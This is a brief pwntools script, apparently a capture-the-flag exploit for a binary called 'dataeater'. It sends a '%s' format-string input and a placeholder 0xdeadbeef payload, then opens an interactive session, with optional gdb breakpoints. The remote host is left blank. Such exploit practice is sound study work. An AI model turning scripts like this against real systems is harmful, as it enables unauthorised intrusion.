import pwn

elf = pwn.context.binary = pwn.ELF("dataeater")
pwn.context.terminal = ['tmux', 'splitw', '-h']

if pwn.args.GDB:
    io = pwn.gdb.debug(
        elf.path, '''b *0x00000000004006e6\nb *0x00000000004006fc\nc\n''')
elif pwn.args.REMOTE:
    io = pwn.remote()
else:
    io = elf.process()

fmt_str = b"%s"+b"\x00"*6
io.send(fmt_str)
payload = pwn.p64(0xdeadbeef)
io.sendline(payload)
io.interactive()
